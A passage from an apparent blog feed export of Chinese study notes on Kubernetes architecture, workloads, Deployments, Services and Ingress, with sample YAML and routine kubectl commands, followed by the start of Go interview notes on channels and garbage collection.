kube-api-server进程，它绑定了master主机的ip地址和6443端口，但是在default命名空间下，存在一个叫kubernetes的服务，该服务对外暴露端口为443，目标端口6443，这个服务的ip地址是clusterip地 址池里面的第一个地址，同时这个服务的yaml定义里面并没有指定标签选择器，也就是说这个 kubernetes服务所对应的endpoint是手动创建的，该endpoint也是名称叫做kubernetes，该endpoint 的yaml定义里面代理到master节点的6443端口，也就是kube-api-server的IP和端口。这样一来，其他 pod 访问kube-api-server的整个流程就是: pod创建后嵌入了环境变量，pod获取到了kubernetes这个服务的ip和443端口，请求到kubernetes这个服务其实就是转发到了master节点上的6443端口的kube-api-server这个pod里面<h2 id="pod挂了，原本到这个pod的流量要怎么办【面试题】"><a href="#pod挂了，原本到这个pod的流量要怎么办【面试题】" class="headerlink" title="pod挂了，原本到这个pod的流量要怎么办【面试题】"></a>pod挂了，原本到这个pod的流量要怎么办【面试题】</h2>首先请求到<br>kubelet用存活探针检测到这个pod挂了，<h2 id="k8s的namespace是什么"><a href="#k8s的namespace是什么" class="headerlink" title="k8s的namespace是什么"></a>k8s的namespace是什么</h2>实现多套环境的资源隔离，限定不同租户能占用的资源，比如CPU和内存Usage等</li></ol><h2 id="持续集成CI的好处，用途是什么"><a href="#持续集成CI的好处，用途是什么" class="headerlink" title="持续集成CI的好处，用途是什么"></a>持续集成CI的好处，用途是什么</h2><p>用于整合团队开发 中不同开发者提交到开发仓库 中的项目代码变化，并即时整合编译，检查整合 编译错误的服务。它需要一天中多次整合编译代码的能力，若出现整合错误， 可以优异地准确定位提交错误源</p><h2 id="14-Docker-Swarm？docker集群"><a href="#14-Docker-Swarm？docker集群" class="headerlink" title="14. Docker Swarm？docker集群"></a>14. Docker Swarm？docker集群</h2><p><strong>是原生的 Docker 集群服务工具。</strong>它将一群 Docker 主机集成为单一一个 虚拟 Docker 主机。利用一个 Docker 守护进程， 通过标准的 Docker API 和任何完善的通讯工具， Docker Swarm 提供透明地将 Docker 主机扩散到多台主机上的服务</p><h2 id="15-Docker-Compose？"><a href="#15-Docker-Compose？" class="headerlink" title="15. Docker Compose？"></a>15. Docker Compose？</h2><h2 id="16-Dockerfile里，ADD和COPY"><a href="#16-Dockerfile里，ADD和COPY" class="headerlink" title="16. Dockerfile里，ADD和COPY"></a>16. Dockerfile里，ADD和COPY</h2><p>差不多，都用来向镜像加文件，一般就COPY就行<br>有必要使用 ADD 指令的最好例子是需要在本地自动解压归档文件到容器中的情况，如 ADD rootfs.tar.xz 。</p><h2 id="17-Dockerfile里，ONBUILD命令"><a href="#17-Dockerfile里，ONBUILD命令" class="headerlink" title="17 Dockerfile里，ONBUILD命令"></a>17 Dockerfile里，ONBUILD命令</h2><p>构建阶段的触发器，当一个镜像被用作另一个镜像的基础镜像时，ONBUILD 指令将在构建过程中自动触发，一般后接一些COPY命令。</p><p>## </p><h2 id="容灾"><a href="#容灾" class="headerlink" title="容灾"></a>容灾</h2><p>主要指在发生硬件故障时，通过备份和恢复机制保证业务连续性（能够继续正常运行）的手段。适用于对业务连续性要求非常高的场景。</p><h2 id="【场景】pod都处于pending状态，调度器失败，pv没做好，无法创建存储卷"><a href="#【场景】pod都处于pending状态，调度器失败，pv没做好，无法创建存储卷" class="headerlink" title="【场景】pod都处于pending状态，调度器失败，pv没做好，无法创建存储卷"></a>【场景】pod都处于pending状态，调度器失败，pv没做好，无法创建存储卷</h2><ul><li>使用kubectl describe podname</li><li>长时间都在pending，可能是schduler无法为pod分配node，Scheduer调度器无法为pod分配一个合适的node节点。而这又会有很多种情况， 比如，node节点处在cpu、内存压力，导致无节点可调度;pod定义了资源请求，没有node节点满足资 源请求;node节点上有污点而pod没有定义容忍;pod中定义了亲和性或反亲和性而没有节点满足这些 亲和性或反亲和性;以上是调度器调度失败的几种情况。</li><li>pvc，pv无法动态创建。比如要使用StatefulSet 创建redis集群，因为粗心大意，定义的storageClassName名称写错了，那么会造成 无法创建pvc，这种情况pod也会一直处于pending状态，或者，即使pvc是正常创建了，但是由于某些异 常原因导致动态供应存储无法正常创建pv，那么这种情况pod也会一直处于pending状态</li></ul>]]></content>
      
      
      <categories>
          
          <category> Kubernetes </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CloudComputing </tag>
            
            <tag> Kubernetes </tag>
            
            <tag> 面试 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Kubernetes Tutorial and Implementation(Overview)</title>
      <link href="/2023/01/01/2023-01-01-kubernets_tutorial(Overview)/"/>
      <url>/2023/01/01/2023-01-01-kubernets_tutorial(Overview)/</url>
      
        <content type="html"><![CDATA[<p>本篇为OverView，内容包括kubectl的基础操作，整理的知识框架基于kubernetes官方文档<a href="https://kubernetes.io/docs/tutorials/" target="_blank" rel="noopener">v1.26</a>， 元旦期间系统整理一下。</p><a id="more"></a><h2 id="Kubernetes-Components-and-Architecture"><a href="#Kubernetes-Components-and-Architecture" class="headerlink" title="Kubernetes Components and Architecture"></a>Kubernetes Components and Architecture</h2><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/components-of-kubernetes.svg" alt title>                </div>                <div class="image-caption"></div>            </figure><h3 id="I-Control-Plane-Components"><a href="#I-Control-Plane-Components" class="headerlink" title="I. Control Plane Components"></a>I. Control Plane Components</h3><p>*<red>Control Plane</red>是对集群进行调度管理的中心*</p><p><strong>API server</strong>(kube-apiserver): The API server is a component of the Kubernetes control plane that exposes the Kubernetes API. The API server is the front end for the Kubernetes control plane.</p><ul><li>作为Control plane的前端，是认证、授权、访问控制、API注册和发现等机制的统一入口，其中API为restful风格，同时交给etcd存储。</li></ul><p><strong><a href="https://etcd.io/docs/" target="_blank" rel="noopener">etcd</a></strong>: Consistent and highly-available key value store used as Kubernetes’ backing store for all cluster data.</p><ul><li>一致且高度可用的键值存储，用作 Kubernetes 的所有集群数据的后台数据库。</li></ul><p><strong>scheduler</strong>(kube-scheduler): Control plane component that watches for newly created Pods with no assigned node, and selects a node for them to run on.</p><ol><li><p>负责节点(Node)的调度与监控，职责为监控新创建的、未指定运行Node的 Pods，并选择Node来让 Pod 运行。</p></li><li><p>调度决策考虑的因素包括单个 Pod 及 Pods 集合的资源需求、软硬件及策略约束、 亲和性及反亲和性规范、数据位置、工作负载间的干扰及最后时限。</p></li></ol><p><strong>controller-manager</strong></p><ol><li>kube-controller-manager: Control plane component that runs controller processes.<br>Logically, each controller is a separate process, but to reduce complexity, they are all compiled into a single binary and run in a single process.</li></ol><ul><li>用于处理集群中常规后台任务，一个资源对应一个控制器，这些控制器包括：<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">节点控制器（Node Controller）：</span><br><span class="line">    负责在节点出现故障时进行通知和响应</span><br><span class="line">任务控制器（Job Controller）：</span><br><span class="line">    监测代表一次性任务的 Job 对象，然后创建 Pods 来运行这些任务直至完成</span><br><span class="line">端点分片控制器（EndpointSlice controller）：</span><br><span class="line">    填充端点分片（EndpointSlice）对象（以提供 Service 和 Pod 之间的链接）。</span><br><span class="line">服务账号控制器（ServiceAccount controller）：</span><br><span class="line">    为新的命名空间创建默认的服务账号（ServiceAccount）。</span><br></pre></td></tr></table></figure></li></ul><ol start="2"><li>cloud-controller-manager:<br>云控制器管理器允许用户将集群连接到云提供商的 API 之上， 并将与该云平台交互的组件同与用户的集群交互的组件分离开来。</li></ol><ul><li>与 kube-controller-manager 类似，cloud-controller-manager 将若干逻辑上独立的控制回路组合到同一个可执行文件中，以同一进程的方式运行。 用户可以对其执行水平扩容（运行不止一个副本）以提升性能或者增强容错能力。<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">节点控制器（Node Controller）：</span><br><span class="line">    用于在节点终止响应后检查云提供商以确定节点是否已被删除</span><br><span class="line">路由控制器（Route Controller）：</span><br><span class="line">    用于在底层云基础架构中设置路由</span><br><span class="line">服务控制器（Service Controller）：</span><br><span class="line">    用于创建、更新和删除云提供商负载均衡器</span><br></pre></td></tr></table></figure></li></ul><h3 id="2-Node"><a href="#2-Node" class="headerlink" title="2.Node"></a>2.Node</h3><p><strong>kubelet</strong>: An agent that runs on each node in the cluster. It makes sure that containers are running in a Pod.</p><ul><li>管理本机容器一个集群中每个节点上运行的代理(agent, not proxy)，它保证容器都运行在Pod中负责维护容器的生命周期，同时也负责Volume(CSI，容器存储接口) 和 网络(CNI，容器网络接口)的管理</li></ul><p><strong>kube-proxy</strong>: kube-proxy is a network proxy that runs on each node in your cluster, implementing part of the Kubernetes Service concept.</p><ul><li>提供网络代理，负载均衡等操作</li></ul><p><strong>Container Runtime</strong>: Docker(Mainly)</p><ul><li>Docker、containerd、cri-o、rktlet以及任何实现Kubernetes CRI (容器运行环境接口) 的软件。<h2 id="II-Kubernetes-WorkLoads"><a href="#II-Kubernetes-WorkLoads" class="headerlink" title="II. Kubernetes WorkLoads"></a>II. Kubernetes WorkLoads</h2><h3 id="Pods"><a href="#Pods" class="headerlink" title="Pods"></a>Pods</h3>Pods are the smallest deployable units of computing that you can create and manage in Kubernetes.</li><li>是k8s中最小的单元</li><li>一组容器的集合</li><li>一个Pod中的所有容器共享同一网络</li><li>生命周期是短暂的（服务器重启后，就找不到了）</li></ul><p>其中<strong>kubectl</strong>是Kubernetes集群的命令行接口, 假设一个demopod.yaml:</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">apiVersion:</span> <span class="string">v1</span> <span class="comment">#kubeapi的版本</span></span><br><span class="line"><span class="attr">kind:</span> <span class="string">Pod</span> <span class="comment">#Pod/Job</span></span><br><span class="line"><span class="attr">metadata:</span></span><br><span class="line"><span class="attr">  name:</span> <span class="string">PodName</span> </span><br><span class="line"><span class="attr">spec:</span></span><br><span class="line"><span class="attr">  containers:</span></span><br><span class="line"><span class="attr">  - name:</span> <span class="string">Container</span> <span class="string">Name</span></span><br><span class="line"><span class="attr">    image:</span> <span class="string">waynamigo/java:runtime</span></span><br><span class="line"><span class="attr">    ports:</span></span><br><span class="line"><span class="attr">    - containerPort:</span> <span class="number">80</span></span><br><span class="line"><span class="attr">  restartPolicy:</span> <span class="string">OnFailure</span></span><br></pre></td></tr></table></figure><p>那么由该yaml启动pod的命令格式为</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">kubectl [<span class="built_in">command</span>] [TYPE] [NAME] [flags]</span><br><span class="line">kubectl apply -f demopod.yaml</span><br></pre></td></tr></table></figure><p><strong>组织形式</strong></p><ul><li><p>1Pod-1Container. 可以将 Pod 看作单个容器的包装器，并且 Kubernetes 直接管理 Pod，而不是容器。</p></li><li><p>1Pod-NContainer. A Pod can encapsulate an application composed of multiple co-located containers that are tightly coupled and need to share resources.<br>一个Pod可封装(encapsulate)由多个紧密耦合(coupled)且需要共享资源的容器组成的应用程序。Pod 将这些容器和存储资源打包为一个可管理的实体。</p></li></ul><p><strong>资源管理方式</strong></p><p>Pod 被设计成支持形成内聚服务单元的多个协作过程，提供两种共享资源：<strong>网络，存储(Volume)</strong>，使成员容器间能够进行数据共享和通信。</p><p><strong>更新与替换 - Update &amp; Replacement</strong></p><ol><li><p>当某Workload的 Pod Template被改变时，Controller会基于更新的模板创建新的 Pod对象，而不是对现有 Pod执行更新或者修补操作。</p></li><li><p>如果对Pod的某些字段执行 patch 和 replace 等更新操作，则有一些限制：</p></li></ol><ul><li><p>Pod 的绝大多数元数据都是不可变的。例如，用户不可以改变其 namespace、name、 uid 或者 creationTimestamp 字段；generation 字段是比较特别的， 如果更新该字段，只能增加字段取值而不能减少。</p></li><li><p>如果 metadata.deletionTimestamp 已经被设置，则不可以向 metadata.finalizers 列表中添加新的条目。</p></li><li><p>Pod 更新不可以改变除 spec.containers.image、spec.initContainers.image、 spec.activeDeadlineSeconds 或 spec.tolerations 之外的字段。 对于 spec.tolerations，用户只被允许添加新的条目。</p></li><li><p>在更新 spec.activeDeadlineSeconds 字段时，以下两种更新操作是被允许的：如果该字段尚未设置，可以将其设置为一个正数；<br>如果该字段已经设置为一个正数，可以将其设置为一个更小的、非负的整数。</p></li></ul><p><strong>其他</strong></p><p>*<a href="https://kubernetes.io/zh-cn/docs/concepts/workloads/pods/pod-lifecycle/" target="_blank" rel="noopener">生命周期</a>*：</p><ul><li>Pending: 起始状态，</li><li>Running: 至少有一个主要容器正常启动，进入Running</li><li>Succeeded/Failed: 取决于 Pod 中是否有容器以失败状态结束</li><li>Unknown: 因为某些原因, 无法取得 Pod 状态。这种情况通常是因为与 Pod 所在主机通信失败。</li></ul><p>*<a href="https://kubernetes.io/zh-cn/docs/concepts/workloads/pods/pod-lifecycle/" target="_blank" rel="noopener">Probe</a>*：容器探针是由 kubelet 对容器执行的定期诊断。要执行诊断，kubelet 可以执行三种动作：</p><ul><li>ExecAction（借助容器运行时执行）</li><li>TCPSocketAction（由 kubelet 直接检测）</li><li>HTTPGetAction（由 kubelet 直接检测）</li></ul><p><em>特权模式</em>：在 Linux 中，Pod 中的任何容器都可以使用容器规约中的 安全性上下文中的 privileged 参数启用特权模式。 </p><p><em>Static Pod</em>：不通过API-server进行管理，直接由特定节点上的 kubelet 守护进程管理，通过 kubelet 直接监控每个 Pod，并在其失效时重启。并且不能引用其他的API对象。</p><h3 id="Volume"><a href="#Volume" class="headerlink" title="Volume"></a>Volume</h3><p>Kubernetes 支持很多类型的卷：</p><ul><li>Volume声明在Pod容器中可访问的文件目录</li><li>一个Pod 可以同时使用任意数目的卷类型。 </li><li>可以被挂载到Pod中一个或多个容器指定路径下-</li><li>Pod 配置中的每个容器必须独立指定各个卷的挂载位置</li><li>支持多种后端存储抽象【本地存储、分布式存储、云存储】</li><li>临时卷类型的生命周期与 Pod 相同</li><li>对于给定 Pod 中任何类型的卷，在容器重启期间数据都不会丢失。</li></ul><p><strong>持久卷</strong> Persistent Volume：是集群中的一块存储，可以由管理员事先制备， 或者使用存储类（Storage Class）来动态制备。</p><p><strong>投射卷</strong> Projected Volume：一个投射卷可以将若干现有的卷源映射到同一个目录之上</p><p><strong>临时卷</strong> Ephemeral Volume：有些应用程序需要额外的存储，但并不关心数据在重启后是否仍然可用。 </p><ul><li><p>缓存服务经常受限于内存大小，而且可以将不常用的数据转移到比内存慢的存储中，对总体性能的影响并不大。</p></li><li><p>另有些应用程序需要以文件形式注入的只读数据，比如配置数据或密钥。</p><h3 id="Controller"><a href="#Controller" class="headerlink" title="Controller"></a>Controller</h3></li><li><p>将当前状态（Current State）更新为期望状态（Desired State）</p></li><li><p>确保预期的pod副本数量【ReplicaSet】</p></li><li><p>无状态应用部署【Deployment】，无状态就是指，不需要依赖于网络或者ip</p></li><li><p>有状态应用部署【StatefulSet】，有状态即需要满足特定的初始条件进行部署</p></li><li><p>确保所有的node运行同一个pod 【DaemonSet】</p></li><li><p>一次性任务和定时任务【Job和CronJob】</p></li></ul><h3 id="Deployment"><a href="#Deployment" class="headerlink" title="Deployment"></a>Deployment</h3><p>Deployment 为 Pod 和其副本(ReplicaSet)提供声明式的更新。</p><ul><li>用户负责描述 Deployment 中的 目标状态，（Controller） 以可控的速度更改实际运行状态（Current State)， 使其变为期望状态(Desired State)。</li></ul><p><strong>创建Deployment</strong></p><ul><li>如下demodeployment.yaml，用户可以定义 Deployment 以创建新的 ReplicaSet，或删除现有 Deployment， 并通过新的 Deployment 分配其资源。<figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">apiVersion:</span> <span class="string">apps/v1</span></span><br><span class="line"><span class="attr">kind:</span> <span class="string">Deployment</span></span><br><span class="line"><span class="attr">metadata:</span></span><br><span class="line"><span class="attr">  name:</span> <span class="string">depName</span></span><br><span class="line"><span class="attr">  labels:</span></span><br><span class="line"><span class="attr">    app:</span> <span class="string">nginx</span></span><br><span class="line"><span class="attr">spec:</span></span><br><span class="line"><span class="attr">  replicas:</span> <span class="number">3</span></span><br><span class="line"><span class="attr">  selector:</span></span><br><span class="line"><span class="attr">    matchLabels:</span></span><br><span class="line"><span class="attr">      app:</span> <span class="string">nginx</span></span><br><span class="line"><span class="attr">  template:</span></span><br><span class="line"><span class="attr">    metadata:</span></span><br><span class="line"><span class="attr">      labels:</span></span><br><span class="line"><span class="attr">        app:</span> <span class="string">nginx</span></span><br><span class="line"><span class="attr">    spec:</span></span><br><span class="line"><span class="attr">      containers:</span></span><br><span class="line"><span class="attr">      - name:</span> <span class="string">nginx</span></span><br><span class="line"><span class="attr">        image:</span> <span class="attr">nginx:1.14.2</span></span><br><span class="line"><span class="attr">        ports:</span></span><br><span class="line"><span class="attr">        - containerPort:</span> <span class="number">80</span></span><br></pre></td></tr></table></figure></li></ul><p>该 Deployment 创建一个 ReplicaSet，包含3个Pod 副本。<br>同样通过kubectl运行：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">$ kubectl apply -f demodeployment.yaml</span><br><span class="line"><span class="comment"># 创建后通过get deployments进行获取运行时信息如下</span></span><br><span class="line">$ kubectl get deployments</span><br><span class="line">NAME      READY   UP-TO-DATE   AVAILABLE   AGE</span><br><span class="line">depName   0/3     0            0           1s</span><br><span class="line"><span class="comment"># 查看 Deployment 上线状态</span></span><br><span class="line">$ kubectl rollout status deployment/depName</span><br><span class="line"><span class="comment"># 查看 Deployment 创建的 ReplicaSet（rs）</span></span><br><span class="line">$ kubectl get rs</span><br><span class="line">NAME                 DESIRED   CURRENT   READY   AGE</span><br><span class="line">depName-75675f5897   3         3         3       18s</span><br><span class="line"><span class="comment"># 查看每个 Pod 自动生成的标签</span></span><br><span class="line">$ kubectl get pods --show-labels</span><br></pre></td></tr></table></figure><ul><li>NAME 列出了名字空间中 Deployment 的名称。</li><li>READY 显示应用程序的可用的“副本”数。显示的模式是“就绪个数/期望个数”。</li><li>UP-TO-DATE 显示为了达到期望状态已经更新的副本数。</li><li>AVAILABLE 显示应用可供用户使用的副本数。</li><li>AGE 显示应用程序运行的时间。</li></ul><p><strong>更新/回滚/缩放/暂停 Deployments</strong></p><p>先来更新上述Pod的container，以使用 nginx:1.16.1 镜像，而不是 nginx:1.14.2 镜像。命令格式如 <figure class="highlight plain"><figcaption><span>set image deployment/metadata.name.depName spec.template.spec.containers[0]image</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">```bash</span><br><span class="line"># 创建</span><br><span class="line">$ kubectl set image deployment/depName nginx=nginx:1.16.1</span><br><span class="line">output: deployment.apps/depName edited</span><br><span class="line"># 查看deployment的details</span><br><span class="line">$ kubectl describe deployments</span><br><span class="line"># 查看上线状态</span><br><span class="line">$ kubectl rollout status deployment/depName</span><br><span class="line">output: </span><br><span class="line">1. Waiting for rollout to finish: 2 out of 3 new replicas have been updated...</span><br><span class="line">2. deployment &quot;depName&quot; successfully rolled out</span><br><span class="line"># 查看更新后的pod states</span><br><span class="line">$ kubectl get pods</span><br></pre></td></tr></table></figure></p><p>回滚操作和git的回滚操作类似</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 检查deployment修改历史</span></span><br><span class="line">$ kubectl rollout <span class="built_in">history</span> deployment/depName</span><br><span class="line">output:</span><br><span class="line">deployments <span class="string">"depname"</span></span><br><span class="line">REVISION    CHANGE-CAUSE</span><br><span class="line">1           kubectl apply --filename=demodeployment.yaml</span><br><span class="line">2           kubectl <span class="built_in">set</span> image deployment/depName nginx=nginx:1.16.1</span><br><span class="line">3           kubectl <span class="built_in">set</span> image deployment/depName nginx=nginx:1.161</span><br><span class="line"><span class="comment"># 可以通过以下方式设置 CHANGE-CAUSE 消息：</span></span><br><span class="line">$ kubectl annotate deployment/depname kubernetes.io/change-cause=<span class="string">"image updated to 1.16.1"</span></span><br><span class="line"><span class="comment"># 查看某个revision的详细信息 可以通过--revisionc参数指定版本：</span></span><br><span class="line">$ kubectl rollout <span class="built_in">history</span> deployment/depName --revision=2</span><br><span class="line"><span class="comment"># 回滚到上一个版本</span></span><br><span class="line">$ kubectl rollout undo deployment/depName</span><br><span class="line"><span class="comment"># 回滚到指定版本 --to-revision=2</span></span><br><span class="line">$ kubectl rollout undo deployment/depName --to-revision=2</span><br><span class="line">output:</span><br><span class="line">deployment.apps/depName rolled back</span><br><span class="line">$ kubectl describe deployment depName</span><br></pre></td></tr></table></figure><p>缩放deployment，即更新replicas，让rs的副本增加或减少</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 定量缩放，比如replicas由3变5个</span></span><br><span class="line">$ kubectl scale deployment/depName --replicas=5</span><br><span class="line"><span class="comment"># 开启Pod的水平自动缩放后，根据cpu利用率设置pod运行个数的上下限</span></span><br><span class="line">$ kubectl autoscale deployment/depName --min=10 --max=15 --cpu-percent=80</span><br><span class="line"><span class="comment"># 限定可共享的资源</span></span><br><span class="line">$ kubectl <span class="built_in">set</span> resources deployment/depName -c=nginx --limits=cpu=200m,memory=512Mi</span><br></pre></td></tr></table></figure><p>同时具有比例缩放特性 Proportional scaling </p><p>//TODO::命令设置</p><p>暂停deployment</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ kubectl rollout pause deployment/depName</span><br></pre></td></tr></table></figure><h3 id="Service"><a href="#Service" class="headerlink" title="Service"></a>Service</h3><ol><li>Service定义了一组pod的访问规则(An abstract way to expose an application running on a set of Pods as a network service.)</li><li>Pod的负载均衡，提供一个或多个Pod的稳定访问地址</li><li>支持多种方式【ClusterIP、NodePort、LoadBalancer】</li></ol><p>In Kubernetes, a Service is an abstraction which defines a logical set of Pods and a policy by which to access them (sometimes this pattern is called a micro-service). The set of Pods targeted by a Service is usually determined by a <a href="https://kubernetes.io/zh-cn/docs/concepts/overview/working-with-objects/labels/" target="_blank" rel="noopener">selector</a>.<br><strong>服务发现</strong></p><ol><li>Service in Kubernetes is a REST object, similar to a Pod. Like all of the REST objects, you can POST a Service definition to the API server to create a new instance. </li><li>用户想要在应用程序中使用 Kubernetes API 进行服务发现，则可以查询 API 服务器用于匹配 EndpointSlices：只要服务中的 Pod 集合发生更改，Kubernetes 就会为服务更新EndpointSlices。</li></ol><p>定义一个demoservice.yaml</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">apiVersion:</span> <span class="string">v1</span></span><br><span class="line"><span class="attr">kind:</span> <span class="string">Service</span></span><br><span class="line"><span class="attr">metadata:</span></span><br><span class="line"><span class="attr">  name:</span> <span class="string">demoservice</span></span><br><span class="line"><span class="attr">spec:</span></span><br><span class="line"><span class="attr">  selector:</span></span><br><span class="line">    <span class="string">app.kubernetes.io/name:</span> <span class="string">MyApp</span> <span class="comment"># 使用该sector辨别pods组</span></span><br><span class="line"><span class="attr">  ports:</span></span><br><span class="line"><span class="attr">    - protocol:</span> <span class="string">TCP</span></span><br><span class="line"><span class="attr">      port:</span> <span class="number">80</span></span><br><span class="line"><span class="attr">      targetPort:</span> <span class="number">9376</span></span><br></pre></td></tr></table></figure><p><strong>Ingress</strong></p><ol><li>首先，Ingress是公开从集群外部到集群内服务的 HTTP 和 HTTPS 路由。 流量路由由 Ingress 资源上定义的规则控制。</li><li>Ingress 是对集群中服务的外部访问进行管理的 API 对象，典型的访问方式是 HTTP。</li><li>Ingress 可以提供负载均衡、SSL 终结和基于名称的虚拟托管。</li><li>An Ingress controller is responsible for fulfilling the Ingress, usually with a load balancer.</li></ol><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">apiVersion:</span> <span class="string">networking.k8s.io/v1</span></span><br><span class="line"><span class="attr">kind:</span> <span class="string">Ingress</span></span><br><span class="line"><span class="attr">metadata:</span></span><br><span class="line"><span class="attr">  name:</span> <span class="string">minimal-ingress</span></span><br><span class="line"><span class="attr">  annotations:</span></span><br><span class="line">    <span class="string">nginx.ingress.kubernetes.io/rewrite-target:</span> <span class="string">/</span></span><br><span class="line"><span class="attr">spec:</span></span><br><span class="line"><span class="attr">  ingressClassName:</span> <span class="string">nginx-example</span></span><br><span class="line"><span class="attr">  rules:</span></span><br><span class="line"><span class="attr">  - http:</span></span><br><span class="line"><span class="attr">      paths:</span></span><br><span class="line"><span class="attr">      - path:</span> <span class="string">/testpath</span></span><br><span class="line"><span class="attr">        pathType:</span> <span class="string">Prefix</span></span><br><span class="line"><span class="attr">        backend:</span></span><br><span class="line"><span class="attr">          service:</span></span><br><span class="line"><span class="attr">            name:</span> <span class="string">test</span></span><br><span class="line"><span class="attr">            port:</span></span><br><span class="line"><span class="attr">              number:</span> <span class="number">80</span></span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> Kubernetes </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CloudComputing </tag>
            
            <tag> Kubernetes </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Golang</title>
      <link href="/2023/01/01/2023-01-02-%E9%9D%A2%E7%BB%8FGo/"/>
      <url>/2023/01/01/2023-01-02-%E9%9D%A2%E7%BB%8FGo/</url>
      
        <content type="html"><![CDATA[<p>总 ：<a href="https://www.bookstack.cn/read/qcrao-Go-Questions/interface.md" target="_blank" rel="noopener">https://www.bookstack.cn/read/qcrao-Go-Questions/interface.md</a></p><a id="more"></a><h1 id="不要通过共享内存来通信，要通过通信来共享内存"><a href="#不要通过共享内存来通信，要通过通信来共享内存" class="headerlink" title="不要通过共享内存来通信，要通过通信来共享内存"></a>不要通过共享内存来通信，要通过通信来共享内存</h1><ul><li>降低共享内存的使用，本来就是解耦和的重要手段之一</li><li>理解时go使用主动的channel通信以最小限度使用这些存在channel里的内存空间，与其他通信的goroutine共享这个channel，范围可以控制在必要的最小规模；而不是先设定好共享内存，再其他开发过程中通过互斥锁、条件变量等方式提供给不同线程去共享内容，导致<h2 id="阐述golang并发机制"><a href="#阐述golang并发机制" class="headerlink" title="阐述golang并发机制"></a>阐述golang并发机制</h2></li></ul><h2 id="为什么小对象多了会造成gc压力"><a href="#为什么小对象多了会造成gc压力" class="headerlink" title="为什么小对象多了会造成gc压力"></a>为什么小对象多了会造成gc压力</h2><ol><li>内存碎片</li><li>gc时会移堆，将对象从一个堆移动到另一个堆（内存拷贝）</li><li>标记的内存块也变多了，遍历的时间变长了<h2 id="gc的触发条件"><a href="#gc的触发条件" class="headerlink" title="gc的触发条件"></a>gc的触发条件</h2></li><li>内存使用量超阈值，用GOGC设置</li><li>使用runtime.GC手动触发<h2 id="gc的栈空间管理机制是什么"><a href="#gc的栈空间管理机制是什么" class="headerlink" title="gc的栈空间管理机制是什么"></a>gc的栈空间管理机制是什么</h2></li><li>runtime负责，</li><li>每个goroutine分配一个固定栈空间，大小大概在2kb到4kb左右</li><li>栈空间不够时，runtime自动扩展栈的大小，回收时runtime回收栈空间变量<h2 id="defer原理"><a 